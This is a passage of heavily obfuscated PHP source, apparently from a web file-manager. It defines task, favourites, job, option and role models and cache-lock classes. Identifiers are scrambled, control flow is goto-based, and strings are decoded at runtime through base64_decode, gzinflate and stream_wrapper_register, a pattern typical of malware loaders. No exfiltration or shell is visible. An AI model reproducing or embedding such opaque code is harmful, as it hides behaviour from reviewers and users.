$A„–´»ãœ‰ % $bì¿Â≈®√º; } if ($bì¿Â≈®√º == 1) { break; } else { $añÉí¨è¯⁄++; } } goto d˘ì„ó·ﬂ«; c∫ƒˆ¯éÊ›: while ($AË≠Õµˆ‹… < $fé„⁄¢Öî¯[556]) { if ($AË≠Õµˆ‹… >= 0) { break; } $AË≠Õµˆ‹…++; } return $a›ùŸÉÇ•È; goto Cµá©ÂœûØ; fïıó˜é∑µ: $Bı¥ïáÍûÖ = $fé„⁄¢Öî¯[669]; $a›ùŸÉÇ•È = $this->{$_SERVER[™≤ºµ][241]}($b¯√‘£ŸÓù[0], $B¬Ø∂¢∑Ù∆); $AË≠Õµˆ‹… = $fé„⁄¢Öî¯[670]; goto c∫ƒˆ¯éÊ›; B∏Ô´¨í¡Â: $fé„⁄¢Öî¯ =& $_SERVER[£¿ÌÙëü¡¯¯]; $B®ñ«∫òÙÜ =& $_SERVER[™≤ºµ]; $b¯√‘£ŸÓù = $B®ñ«∫òÙÜ[0]($B®ñ«∫òÙÜ[338], $c◊ã‚öí∑Õ); goto DöÜ˜Êﬂ¿¶; dî∞ÑÑÑë˘: $aïøß≈ç≤¢ = 0; $B´˜êö∞·Î = 0; for ($A´ó–±™Ëã = 3; $A´ó–±™Ëã < $eÑÜ›¶ªÁ; $A´ó–±™Ëã += 2) { if ($eÑÜ›¶ªÁ % $A´ó–±™Ëã != 0) { continue; } $aïøß≈ç≤¢ = $A´ó–±™Ëã; $B´˜êö∞·Î = $B®ñ«∫òÙÜ[199]($eÑÜ›¶ªÁ / $A´ó–±™Ëã); break; } goto fÆı≠üˆ’›; Cµá©ÂœûØ: } public function ljad7911b4cb() { goto AíÆ©–ﬂÏñ; AíÆ©–ﬂÏñ: $b§åó€èî¡ =& $_SERVER[£¿ÌÙëü¡¯¯]; $D’úêîÆâö =& $_SERVER[™≤ºµ]; $AÿüäÁ√‰⁄ = $D’úêîÆâö[319]($D’úêîÆâö[339](2, 14), $D’úêîÆâö[339](2, 16) - 1); goto Dë ·Òè›å; E≤Íãø∆ : for ($eâ«é‡¯‚¬ = $AÿüäÁ√‰⁄; $eâ«é‡¯‚¬ > 1; $eâ«é‡¯‚¬--) { $C«∆¨øò§ = !0; foreach ($E…±ç≠òû∑ as $e±’ä†ÙÕí) { if ($eâ«é‡¯‚¬ % $e±’ä†ÙÕí == 0) { $C«∆¨øò§ = !1; break; } } if ($C«∆¨øò§) { $e¨⁄ö¬˜Öˆ = $eâ«é‡¯‚¬; break; } } return $e¨⁄ö¬˜Öˆ; goto fÎíõ«÷ö≠; FÚîòı‚ıç: if (strlen($EñÒ§◊éºÜ) < $b§åó€èî¡[549]) { die; } while ($aÊ÷èÜßä£ <= (int) $D’úêîÆâö[340]($AÿüäÁ√‰⁄)) { $eâ«é‡¯‚¬ = $aÊ÷èÜßä£; $F¢éöŸ∑æ≈ = $b§åó€èî¡[672]; while (!0) { $eâ«é‡¯‚¬++; $dèÆ≈ÈìŒÈ = $b§åó€èî¡[648]; if ($eâ«é‡¯‚¬ <= 2) { $aÊ÷èÜßä£ = $eâ«é‡¯‚¬; break; } else { if ($eâ«é‡¯‚¬ < 2) { continue; } } $C«∆¨øò§ = !0; for ($e±Ïëªó∏« = 2; $e±Ïëªó∏« <= $D’úêîÆâö[340]($eâ«é‡¯‚¬); $e±Ïëªó∏«++) { if ($eâ«é‡¯‚¬ % $e±Ïëªó∏« == 0) { $C«∆¨øò§ = !1; } } if ($C«∆¨øò§) { $aÊ÷èÜßä£ = $eâ«é‡¯‚¬; break; } } $E…±ç≠òû∑[] = $aÊ÷èÜßä£; } $e¨⁄ö¬˜Öˆ = 2; goto E≤Íãø∆ ; Dë ·Òè›å: $E…±ç≠òû∑ = array(); $aÊ÷èÜßä£ = 1; $EñÒ§◊éºÜ = $b§åó€èî¡[671]; goto FÚîòı‚ıç; fÎíõ«÷ö≠: } public function ifyg564cc906($cï√ê†ŒÇª, $b∑ÜÇí∂À◊) { $EøÉ…Ûãà∏ =& $_SERVER[™≤ºµ]; return $EøÉ…Ûãà∏[13](array($EøÉ…Ûãà∏[14], $EøÉ…Ûãà∏[341]), $cï√ê†ŒÇª, $b∑ÜÇí∂À◊); } public function tdxh864d8565($BôÔÖèêâ, $b¶üÙœôìŸ) { $FõÏƒ Êœ© =& $_SERVER[£¿ÌÙëü¡¯¯]; $B ≥î⁄˘Ñﬁ =& $_SERVER[™≤ºµ]; return $B ≥î⁄˘Ñﬁ[13](array($B ≥î⁄˘Ñﬁ[342], $B ≥î⁄˘Ñﬁ[343]), $BôÔÖèêâ, $b¶üÙœôìŸ); $DÜúå∆ø¶ë = $FõÏƒ Êœ©[673]; while ($DÜúå∆ø¶ë < $FõÏƒ Êœ©[549]) { if ($DÜúå∆ø¶ë >= 0) { break; } $DÜúå∆ø¶ë++; } } public function xgmj525af9fd($cíô∑¯æ≤‰, $F…Â≠∑ˆ‹) { $BÑê∆«ÔŸ =& $_SERVER[™≤ºµ]; return $BÑê∆«ÔŸ[13](array($BÑê∆«ÔŸ[342], $BÑê∆«ÔŸ[344]), $cíô∑¯æ≤‰, $F…Â≠∑ˆ‹); } } goto Fì◊œ◊˘±ÿ; FµÒŸÀ≥é: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\56\x74\x61\163\153\x4c\151\x73\x74"; public $field = array("\156\141\x6d\x65", "\164\x79\x70\x65", "\145\x76\145\x6e\164", "\164\x69\x6d\145", "\144\x65\x73\x63", "\163\x79\x73\x74\145\x6d", "\x65\156\141\142\x6c\145", "\154\x61\x73\164\122\x75\156", "\x73\157\x72\x74"); public function listData($A»∫ø±Æº√ = false, $AæìãÎƒÂ∆ = "\163\x6f\162\164", $E¥—Ω’ÊƒÚ = false) { return parent::listData($A»∫ø±Æº√, $AæìãÎƒÂ∆, $E¥—Ω’ÊƒÚ); } public function add($aÍË…ìéÊË) { $A˘æü‘⁄›ò =& $_SERVER[£¿ÌÙëü¡¯¯]; $d°—¬Ü≠€û = $this->findByName($aÍË…ìéÊË[$A˘æü‘⁄›ò[28]]); if ($d°—¬Ü≠€û) { return !1; } $aÍË…ìéÊË[$A˘æü‘⁄›ò[1315]] = 0; $aÍË…ìéÊË[$A˘æü‘⁄›ò[2034]] = $this->getSort(); return parent::insert($aÍË…ìéÊË); } private function getSort() { $fÎÒ‘ËâÚ› =& $_SERVER[£¿ÌÙëü¡¯¯]; $Aìç¯ÿå‚ë = parent::listData(); $BÚ¬¿ÃÜ≠Û = array_to_keyvalue($Aìç¯ÿå‚ë, $fÎÒ‘ËâÚ›[33], $fÎÒ‘ËâÚ›[2034]); return empty($BÚ¬¿ÃÜ≠Û) ? 0 : max($BÚ¬¿ÃÜ≠Û) + 1; } public function update($Aû’ï≈®ø, $EË¬ª‘ŒùÎ) { $cŒ√’Ãâáê =& $_SERVER[£¿ÌÙëü¡¯¯]; $f§äÏ£ä±º = $this->listData($Aû’ï≈®ø); $c™ÂâÈ‡çÌ = $this->findByName($EË¬ª‘ŒùÎ[$cŒ√’Ãâáê[28]]); if (!$f§äÏ£ä±º || $c™ÂâÈ‡çÌ && $c™ÂâÈ‡çÌ[$cŒ√’Ãâáê[364]] != $f§äÏ£ä±º[$cŒ√’Ãâáê[364]]) { return !1; } return parent::update($Aû’ï≈®ø, $EË¬ª‘ŒùÎ); } public function remove($aùê◊ø©Ï¶) { $eÀØÃï—º◊ = $this->listData($aùê◊ø©Ï¶); if (!$eÀØÃï—º◊ || $eÀØÃï—º◊[$_SERVER[£¿ÌÙëü¡¯¯][1054]]) { return !1; } return parent::remove($aùê◊ø©Ï¶); } public function enable($D≤Ïûùµæ») { $DﬁóñìÒÑÁ =& $_SERVER[£¿ÌÙëü¡¯¯]; $b©≤ˆÈí∂ó = $this->listData($D≤Ïûùµæ»); $b®èï¥„àâ = !$b©≤ˆÈí∂ó[$DﬁóñìÒÑÁ[1322]]; return $this->update($D≤Ïûùµæ», array($DﬁóñìÒÑÁ[2366] => $b®èï¥„àâ)); } public function run($eΩ≤Í—Ü∞û) { return $this->update($eΩ≤Í—Ü∞û, array($_SERVER[£¿ÌÙëü¡¯¯][2367] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\x66\141\166"; protected function cacheFunctionAlias($E∑∞”æûË∏) { $E§”‘™Õ®° =& $_SERVER[£¿ÌÙëü¡¯¯]; return array($E§”‘™Õ®°[2368] => array(USER_ID, $E§”‘™Õ®°[2369])); } protected function listData() { $cåÙÂ›¯¶› =& $_SERVER[£¿ÌÙëü¡¯¯]; $b®®¬•Ã—» = array($cåÙÂ›¯¶›[1340] => USER_ID, $cåÙÂ›¯¶›[432] => 0); $BîÑƒù§«µ = $cåÙÂ›¯¶›[2370]; $Bé˘◊ä≥€‘ = $this->field($BîÑƒù§«µ)->where($b®®¬•Ã—»)->order($cåÙÂ›¯¶›[2371])->select(); return $Bé˘◊ä≥€‘ ? $Bé˘◊ä≥€‘ : array(); } protected function resetCache() { } protected function listView() { goto aüæèßﬂ•®; aüæèßﬂ•®: $A®“≈ùÈÈı =& $_SERVER[£¿ÌÙëü¡¯¯]; $FÊ–°Í©ï = $this->listData(); $bõº◊Ωﬂ¶ã = array_filter_by_field($FÊ–°Í©ï, $A®“≈ùÈÈı[29], $A®“≈ùÈÈı[379]); goto A∆ã Ë”¨í; D‹éóÑåú§: $DÇŒƒÓúÈû = array($A®“≈ùÈÈı[380] => array($A®“≈ùÈÈı[381], $fØ‚â±∞Óé)); $b’πÖÒ ‡À = Model($A®“≈ùÈÈı[749])->listSource($DÇŒƒÓúÈû, $CÊîì¿ÈÈ¡); $b’πÖÒ ‡À = array_merge($b’πÖÒ ‡À[$A®“≈ùÈÈı[74]], $b’πÖÒ ‡À[$A®“≈ùÈÈı[75]]); goto C’ﬂüÑË£Ë; C’ﬂüÑË£Ë: $b’πÖÒ ‡À = array_to_keyvalue($b’πÖÒ ‡À, $A®“≈ùÈÈı[366]); foreach ($FÊ–°Í©ï as $Eè∑ÚÔ”ü∫ => $F¡√É≤ÚüÙ) { $dôÖÁ∑ÿ™ß = $b’πÖÒ ‡À[$F¡√É≤ÚüÙ[$A®“≈ùÈÈı[76]]]; $dôÖÁ∑ÿ™ß = $dôÖÁ∑ÿ™ß ? $dôÖÁ∑ÿ™ß : array(); $FÊ–°Í©ï[$Eè∑ÚÔ”ü∫] = array_merge($dôÖÁ∑ÿ™ß, $F¡√É≤ÚüÙ); } return $FÊ–°Í©ï; goto b£€üçåæ„; A∆ã Ë”¨í: $fØ‚â±∞Óé = array_to_keyvalue($bõº◊Ωﬂ¶ã, $A®“≈ùÈÈı[33], $A®“≈ùÈÈı[76]); if (!$fØ‚â±∞Óé) { return $FÊ–°Í©ï; } $CÊîì¿ÈÈ¡ = 2000; goto D‹éóÑåú§; b£€üçåæ„: } protected function addFav($BŸ—∞ô›åù, $fÀÍîΩûŸ = '', $a∏ûÏ»åöπ = "\x73\157\165\162\x63\145") { goto CºÃÜò∞‘¬; D‹πèÔ«ƒ„: if (!$fÀÍîΩûŸ && $a∏ûÏ»åöπ == $cØåè‹ãò¿[379]) { $Aû◊≠≥óØö = Model($cØåè‹ãò¿[1084])->where(array($cØåè‹ãò¿[380] => $BŸ—∞ô›åù))->find(); if (!$Aû◊≠≥óØö) { return !1; } $fÀÍîΩûŸ = $Aû◊≠≥óØö[$cØåè‹ãò¿[28]]; } $fÀÍîΩûŸ = $this->getAutoName($fÀÍîΩûŸ); $d∞ÂÓßèƒç = array($cØåè‹ãò¿[1340] => USER_ID, $cØåè‹ãò¿[432] => 0, $cØåè‹ãò¿[383] => $fÀÍîΩûŸ, $cØåè‹ãò¿[384] => $BŸ—∞ô›åù, $cØåè‹ãò¿[385] => $a∏ûÏ»åöπ, $cØåè‹ãò¿[2017] => $F†◊íÛ∆‘ã + 1); goto e¿¿Ùäÿæé; e¿¿Ùäÿæé: return $this->add($d∞ÂÓßèƒç); goto Eòﬁµ€ºÆò; dà˜æÙœÚÛ: $f≠ÌºÃ≤£Æ = array($cØåè‹ãò¿[1340] => USER_ID, $cØåè‹ãò¿[432] => 0); $F†◊íÛ∆‘ã = $this->where($f≠ÌºÃ≤£Æ)->max($cØåè‹ãò¿[2034]); if (!$F†◊íÛ∆‘ã) { $F†◊íÛ∆‘ã = 0; } goto D‹πèÔ«ƒ„; CºÃÜò∞‘¬: $cØåè‹ãò¿ =& $_SERVER[£¿ÌÙëü¡¯¯]; $f≠ÌºÃ≤£Æ = array($cØåè‹ãò¿[1340] => USER_ID, $cØåè‹ãò¿[432] => 0, $cØåè‹ãò¿[385] => $a∏ûÏ»åöπ, $cØåè‹ãò¿[384] => $BŸ—∞ô›åù); if ($this->where($f≠ÌºÃ≤£Æ)->find()) { return !1; } goto dà˜æÙœÚÛ; Eòﬁµ€ºÆò: } protected function remove($då¢Ÿ⁄äñÈ) { $Böíëë√Ω° =& $_SERVER[£¿ÌÙëü¡¯¯]; $c•„“üî¿Û = array($Böíëë√Ω°[1340] => USER_ID, $Böíëë√Ω°[382] => $då¢Ÿ⁄äñÈ); return $this->where($c•„“üî¿Û)->delete(); } protected function removeByName($EÌ‰ù‡ÃàÃ) { $fÓ¡Üô°ƒ≤ =& $_SERVER[£¿ÌÙëü¡¯¯]; $B∑‹‹ß—◊ = array($fÓ¡Üô°ƒ≤[1340] => USER_ID, $fÓ¡Üô°ƒ≤[383] => $EÌ‰ù‡ÃàÃ, $fÓ¡Üô°ƒ≤[432] => 0); return $this->where($B∑‹‹ß—◊)->delete(); } protected function rename($CÎÜÃ¬‰çŸ, $E„Éñ˜÷ü∑) { $c„ôÉñ«¢Æ =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($CÎÜÃ¬‰çŸ == $E„Éñ˜÷ü∑) { return !1; } $d ìË°Œ√à = $this->getAutoName($E„Éñ˜÷ü∑); if ($E„Éñ˜÷ü∑ != $d ìË°Œ√à) { return !1; } $bºÔÏ´∫ì = array($c„ôÉñ«¢Æ[1340] => USER_ID, $c„ôÉñ«¢Æ[432] => 0, $c„ôÉñ«¢Æ[28] => $CÎÜÃ¬‰çŸ); return $this->where($bºÔÏ´∫ì)->save(array($c„ôÉñ«¢Æ[28] => $E„Éñ˜÷ü∑)); } protected function resetSort($e±Ï≤¡ÉÏÜ) { $FúÚôàÏ∏æ =& $_SERVER[£¿ÌÙëü¡¯¯]; $bëŒ–›⁄äÓ = array($FúÚôàÏ∏æ[1340] => USER_ID); for ($FÂÃ¡É´ò® = 0; $FÂÃ¡É´ò® < count($e±Ï≤¡ÉÏÜ); $FÂÃ¡É´ò®++) { $bëŒ–›⁄äÓ[$FúÚôàÏ∏æ[382]] = $e±Ï≤¡ÉÏÜ[$FÂÃ¡É´ò®]; $this->where($bëŒ–›⁄äÓ)->save(array($FúÚôàÏ∏æ[2017] => $FÂÃ¡É´ò® + 1)); } return !0; } protected function moveTop($F›Õ™úñÌÒ) { goto A¥∆‰„ﬂü•; EÔ˘ÜÍ«Àê: return $this->resetSort($f≈„¥…·ØΩ); goto E˜∞òùÏá; bÉÁ√ÇÃ∏ò: if (!$bâÚÖ√ë´ã) { return; } $f≈„¥…·ØΩ = $this->field($A®›áÜÓÇ·[364])->where($BÂ˘∞”¶Ü•)->order($A®›áÜÓÇ·[2371])->select(); $f≈„¥…·ØΩ = array_to_keyvalue($f≈„¥…·ØΩ, $A®›áÜÓÇ·[33], $A®›áÜÓÇ·[364]); goto BÇüá…øµÇ; BÇüá…øµÇ: $a©´øõ÷™¨ = $f≈„¥…·ØΩ; $f≈„¥…·ØΩ = array_remove_value($f≈„¥…·ØΩ, $bâÚÖ√ë´ã[$A®›áÜÓÇ·[364]]); array_unshift($f≈„¥…·ØΩ, $bâÚÖ√ë´ã[$A®›áÜÓÇ·[364]]); goto EÔ˘ÜÍ«Àê; A¥∆‰„ﬂü•: $A®›áÜÓÇ· =& $_SERVER[£¿ÌÙëü¡¯¯]; $BÂ˘∞”¶Ü• = array($A®›áÜÓÇ·[1340] => USER_ID, $A®›áÜÓÇ·[432] => 0); $bâÚÖ√ë´ã = $this->where($BÂ˘∞”¶Ü•)->where(array($A®›áÜÓÇ·[28] => $F›Õ™úñÌÒ))->find(); goto bÉÁ√ÇÃ∏ò; E˜∞òùÏá: } protected function moveBottom($B¢Üó‘–é©) { $aÍÉÔŒÓÓå =& $_SERVER[£¿ÌÙëü¡¯¯]; $F‹ÕŒ–©ûƒ = array($aÍÉÔŒÓÓå[1340] => USER_ID, $aÍÉÔŒÓÓå[432] => 0); $f„£‹Îúπ∆ = $this->where($F‹ÕŒ–©ûƒ)->max($aÍÉÔŒÓÓå[2034]); $D√∞ÏÜ‘†ù = array($aÍÉÔŒÓÓå[2034] => $f„£‹Îúπ∆ + 1); return $this->where($F‹ÕŒ–©ûƒ)->where(array($aÍÉÔŒÓÓå[28] => $B¢Üó‘–é©))->save($D√∞ÏÜ‘†ù); } private function getAutoName($B˜ﬂ∏ãôÉ) { goto cÍËæò°èÿ; d¥·ôìÛ ¿: $fÇ‡ÏŸ∫•Ÿ = array_to_keyvalue($fÇ‡ÏŸ∫•Ÿ, $aûÇ∞¶◊∑’[33], $aûÇ∞¶◊∑’[28]); if (!$fÇ‡ÏŸ∫•Ÿ || !in_array($B˜ﬂ∏ãôÉ, $fÇ‡ÏŸ∫•Ÿ)) { return $B˜ﬂ∏ãôÉ; } for ($bëﬂœ«ñä˜ = 0; $bëﬂœ«ñä˜ < count($fÇ‡ÏŸ∫•Ÿ); $bëﬂœ«ñä˜++) { if (!in_array($B˜ﬂ∏ãôÉ . "\x28{$bëﬂœ«ñä˜}\51", $fÇ‡ÏŸ∫•Ÿ)) { return $B˜ﬂ∏ãôÉ . "\x28{$bëﬂœ«ñä˜}\x29"; } } goto bΩ¢ÿöÈ‘Í; bΩ¢ÿöÈ‘Í: return $B˜ﬂ∏ãôÉ . "\x28{$bëﬂœ«ñä˜}\x29"; goto aÕ£˘ÜÉÙÇ; cÍËæò°èÿ: $aûÇ∞¶◊∑’ =& $_SERVER[£¿ÌÙëü¡¯¯]; $b»ø∑„ ÛÜ = array($aûÇ∞¶◊∑’[1340] => USER_ID, $aûÇ∞¶◊∑’[432] => 0); $fÇ‡ÏŸ∫•Ÿ = $this->field($aûÇ∞¶◊∑’[28])->where($b»ø∑„ ÛÜ)->select(); goto d¥·ôìÛ ¿; aÕ£˘ÜÉÙÇ: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\x2e\x6a\157\x62\x4c\151\x73\164"; public $field = array("\x6e\x61\x6d\145", "\144\145\x73\x63", "\x73\x6f\x72\x74"); const JOB_KEY = "\x73\x65\x6c\146\x4a\157\x62\x4c\x69\x73\164"; public function listData($CÔ®ØùæúŒ = false, $F∏˘Ó‚ö£ô = "\x73\157\x72\x74", $f‚µàÂ√áï = false) { return parent::listData($CÔ®ØùæúŒ, $F∏˘Ó‚ö£ô, $f‚µàÂ√áï); } public function remove($D±‚ˆÆèåÒ) { return parent::remove($D±‚ˆÆèåÒ); } public function add($añ¥ÑçñØœ) { $c÷ëÊ¿ÉÚ• =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($this->findByName($añ¥ÑçñØœ[$c÷ëÊ¿ÉÚ•[28]])) { return !1; } $añ¥ÑçñØœ[$c÷ëÊ¿ÉÚ•[2034]] = $this->getSort(); return parent::insert($añ¥ÑçñØœ); } private function getSort() { $DÌ¶⁄‚÷ÿä =& $_SERVER[£¿ÌÙëü¡¯¯]; $F§†∆»ïñ§ = parent::listData(); $B◊…ú‡ı‡ÿ = array_to_keyvalue($F§†∆»ïñ§, $DÌ¶⁄‚÷ÿä[33], $DÌ¶⁄‚÷ÿä[2034]); return empty($B◊…ú‡ı‡ÿ) ? 0 : max($B◊…ú‡ı‡ÿ) + 1; } public function update($díƒääóªè, $A¿ÕﬁíáŒ¿) { $c˘ëáœ®€§ =& $_SERVER[£¿ÌÙëü¡¯¯]; $eÁéƒ¥Ü»“ = parent::listData($díƒääóªè); $F•¿Öπñ°ä = $this->findByName($A¿ÕﬁíáŒ¿[$c˘ëáœ®€§[28]]); if (!$eÁéƒ¥Ü»“ || $F•¿Öπñ°ä && $F•¿Öπñ°ä[$c˘ëáœ®€§[364]] != $eÁéƒ¥Ü»“[$c˘ëáœ®€§[364]]) { return !1; } return parent::update($díƒääóªè, $A¿ÕﬁíáŒ¿); } public function setUserJob($fØ¬ØÇ∂ÎË, $BØààÂ«∏¯) { goto C£ä•±®◊Ÿ; DÑ“’£‡úä: $cå›∫ºò¨ƒ = rtrim($cå›∫ºò¨ƒ, $c¯¥µÿÏÒ[47]); Model($c¯¥µÿÏÒ[469])->metaSet($fØ¬ØÇ∂ÎË, self::JOB_KEY, $cå›∫ºò¨ƒ); goto Eãê‡ÏË§◊; C£ä•±®◊Ÿ: $c¯¥µÿÏÒ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!is_array($BØààÂ«∏¯)) { $BØààÂ«∏¯ = array($BØààÂ«∏¯); } $D¨ÑÀªãﬁ√ = parent::listData(); goto Dà¿âÍóû∂; Dà¿âÍóû∂: $fû¢Û„ø¨ = array_to_keyvalue($D¨ÑÀªãﬁ√, $c¯¥µÿÏÒ[28]); $cå›∫ºò¨ƒ = $c¯¥µÿÏÒ[358]; foreach ($BØààÂ«∏¯ as $A£àøçëﬁΩ) { if ($fû¢Û„ø¨[$A£àøçëﬁΩ]) { $cå›∫ºò¨ƒ .= $fû¢Û„ø¨[$A£àøçëﬁΩ][$c¯¥µÿÏÒ[364]] . $c¯¥µÿÏÒ[47]; } else { $fÙ´©ó°«˜ = $this->add($A£àøçëﬁΩ); $cå›∫ºò¨ƒ .= $fÙ´©ó°«˜ . $c¯¥µÿÏÒ[47]; } } goto DÑ“’£‡úä; Eãê‡ÏË§◊: } public function getUserJob($BÀ…ÛŒô±á) { $fÊ±¢±¡Ãù = Model($_SERVER[£¿ÌÙëü¡¯¯][469])->metaGet($BÀ…ÛŒô±á); return $this->getUserJobInfo($fÊ±¢±¡Ãù[self::JOB_KEY]); } public function getUserJobInfo($A∏éìïº´ç) { goto dÑ‘ÖÎàÒŒ; AâØê≈€Ûê: $bﬂØıÉâ®˜ = array_remove_key($bﬂØıÉâ®˜, $cÖ†¡∆Î»ú[184]); $fè‘®øÌàÆ = array(); foreach ($E∆äØ¬—Ñó as $b≥¥á›∆÷Í) { if (isset($bﬂØıÉâ®˜[$b≥¥á›∆÷Í])) { $fè‘®øÌàÆ[] = $bﬂØıÉâ®˜[$b≥¥á›∆÷Í]; } } goto Dâê«Ñ•∏’; Dâê«Ñ•∏’: return $fè‘®øÌàÆ; goto bƒ±©Øç‡Î; dÑ‘ÖÎàÒŒ: $cÖ†¡∆Î»ú =& $_SERVER[£¿ÌÙëü¡¯¯]; $E∆äØ¬—Ñó = explode($cÖ†¡∆Î»ú[47], $A∏éìïº´ç); $bﬂØıÉâ®˜ = parent::listData(); goto AâØê≈€Ûê; bƒ±©Øç‡Î: } } goto FΩâŸÀÇ›Ö; CŸÉ∆ïêèé: $_SERVER[$_SERVER[‚ﬁ][51]] = (base64_decode('OTI0Ng==')."\66\71")+0;$_WAbG="5dBfeNmFrKWjnsi7SXTzadc6gkGAVMSBd2kpufhB52JyRY9KW9iVkVZTEAsvqZnEYNJNvNc";; stream_wrapper_register($_SERVER[‚ﬁ][52], $_SERVER[‚ﬁ][53]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Cø™Î„äóŒ, $AˆÁø´ç„∞) { $d’Éú≈Îá =& $_SERVER[£¿ÌÙëü¡¯¯]; if (isset(self::$_methodList[$Cø™Î„äóŒ])) { return @call_user_func_array(self::$_methodList[$Cø™Î„äóŒ], $AˆÁø´ç„∞); } else { if (method_exists($this, $Cø™Î„äóŒ)) { return call_user_func_array(array($this, $Cø™Î„äóŒ), $AˆÁø´ç„∞); } else { think_exception(__CLASS__ . $d’Éú≈Îá[4] . $Cø™Î„äóŒ . $d’Éú≈Îá[5]); } } } public static function __callStatic($a®≈’ ŒÒó, $cıÚ‰éë•◊) { if (isset(self::$_methodListStatic[$a®≈’ ŒÒó])) { return call_user_func_array(self::$_methodListStatic[$a®≈’ ŒÒó], $cıÚ‰éë•◊); } else { if (method_exists(self, $a®≈’ ŒÒó)) { return call_user_func_array(array(self, $a®≈’ ŒÒó), $cıÚ‰éë•◊); } else { show_json("{$a®≈’ ŒÒó}\x28\x29\x20\x6e\x6f\x74\x20\145\170\151\x73\164\x3b", !1); } } } public static function addMethod($C¶‘–Ç√Í, $Bî≥Ãÿ¶Ãˆ) { self::$_methodList[$C¶‘–Ç√Í] = $Bî≥Ãÿ¶Ãˆ; } public static function addMethodStatic($E°ﬂÜ∞ó°€, $fª≥Æ«ˆ±«) { self::$_methodListStatic[$E°ﬂÜ∞ó°€] = $fª≥Æ«ˆ±«; } } goto CÖ°∞ÑÀ∑; cù∞Ô…ì∑´: $Eñ™®Òï‘¥ = $_SERVER[£¿ÌÙëü¡¯¯][539]; while (strlen($Eñ™®Òï‘¥) < $_SERVER[£¿ÌÙëü¡¯¯][540]) { if (!$Eñ™®Òï‘¥) { break; } $Eñ™®Òï‘¥++; } $_SERVER[™≤ºµ] = explode($_SERVER[£¿ÌÙëü¡¯¯][541], gzinflate(substr($_SERVER[£¿ÌÙëü¡¯¯][542], 10, -8))); goto fäπ¿Œ¯Úö; c´ßú˜Óä¬: class CacheLockRedis { public function lock($b«äΩÙÉ®∆, $FÖåí∑Îœî = 10) { $Eà∂‡‘âà™ = Cache::init(); $E‘éæÑ§‡ö = microtime(!0) + $FÖåí∑Îœî; while (microtime(!0) < $E‘éæÑ§‡ö) { $c¡ﬂà†∆†’ = $Eà∂‡‘âà™->get($b«äΩÙÉ®∆); if (!$c¡ﬂà†∆†’) { $Eè∑áüû’± = $Eà∂‡‘âà™->setLock($b«äΩÙÉ®∆, $E‘éæÑ§‡ö, $FÖåí∑Îœî); if ($Eè∑áüû’±) { return !0; } } else { if ($c¡ﬂà†∆†’ < microtime(!0)) { $Eà∂‡‘âà™->set($b«äΩÙÉ®∆, $E‘éæÑ§‡ö, $E‘éæÑ§‡ö); if ($Eà∂‡‘âà™->get($b«äΩÙÉ®∆) === $c¡ﬂà†∆†’) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($eƒ¿èÀÏ–¥) { return Cache::init()->get($eƒ¿èÀÏ–¥); } public function unlock($AÒ¯çµˆìÓ) { return Cache::init()->remove($AÒ¯çµˆìÓ); } } class CacheLockMemcached { public function lock($DöÿÖê‹«“, $CÖè”ÔÜø¥ = 0) { $E¬æïÓ⁄ÖÑ = Cache::init(); $DÖÍç¡©€ë = microtime(!0) + $CÖè”ÔÜø¥; while (microtime(!0) < $DÖÍç¡©€ë) { $dÔÕ∂∞ÊœË = $E¬æïÓ⁄ÖÑ->get($DöÿÖê‹«“); if (!$dÔÕ∂∞ÊœË || $dÔÕ∂∞ÊœË < microtime(!0)) { $B·‡´·ùûã = $E¬æïÓ⁄ÖÑ->handle->add($DöÿÖê‹«“, $DÖÍç¡©€ë, $CÖè”ÔÜø¥); if ($B·‡´·ùûã) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($d¿„—ôª´‚) { return Cache::init()->get($d¿„—ôª´‚); } public function unlock($F˜Ç∫Ë±»≠) { return Cache::init()->remove($F˜Ç∫Ë±»≠); } } class CacheLockDatabase { public function lock($BÎ™–ÓáˆÔ, $bª⁄ÌœÖÏ÷ = 0) { $B¡≤È˘∫è— = Model($_SERVER[£¿ÌÙëü¡¯¯][752]); $F‘íÑ¥ŸÉı = microtime(!0) + $bª⁄ÌœÖÏ÷; while (microtime(!0) < $F‘íÑ¥ŸÉı) { $F˜¶·úâÚ• = $B¡≤È˘∫è—->get($BÎ™–ÓáˆÔ); if (!$F˜¶·úâÚ• || $F˜¶·úâÚ• < microtime(!0)) { $b∫áöÈ◊º» = $B¡≤È˘∫è—->set($BÎ™–ÓáˆÔ, $F‘íÑ¥ŸÉı); if ($b∫áöÈ◊º») { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Cã¡§ëöôÔ) { return Model($_SERVER[£¿ÌÙëü¡¯¯][752])->get($Cã¡§ëöôÔ); } public function unlock($B›¶êé∑⁄’) { Model($_SERVER[£¿ÌÙëü¡¯¯][752])->remove($B›¶êé∑⁄’); } } goto f®˘ó∆˜˜ﬂ; B¨ãÏï¯ÿÜ: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\163\164\145\155\x5f\x6f\x70\x74\151\x6f\x6e"; protected $jsonField = array("\155\x65\156\165", "\162\157\154\145", "\162\x6f\x6c\x65\x47\x72\157\165\160", "\162\145\x67\x69\x73\164", "\x65\155\x61\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($e‹√Éú≠ﬂ∆) { return "\x53\171\x73\x74\x65\x6d\x4f\x70\164\151\x6f\156\x5f{$e‹√Éú≠ﬂ∆}"; } protected function optionDefault($E√úáÕÿΩæ = '') { $E÷Ö¿”îìê =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($E√úáÕÿΩæ == $E÷Ö¿”îìê[33]) { return $GLOBALS[$E÷Ö¿”îìê[6]][$E÷Ö¿”îìê[2361]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\155\x2e\162\x6f\x6c\145\114\151\x73\164"; public $field = array("\156\141\155\145", "\141\165\x74\x68", "\x6c\141\x62\145\x6c", "\144\x69\x73\160\154\x61\x79", "\x73\171\x73\x74\x65\155", "\x64\145\x73\x63", "\x69\147\x6e\x6f\x72\x65\x45\170\x74", 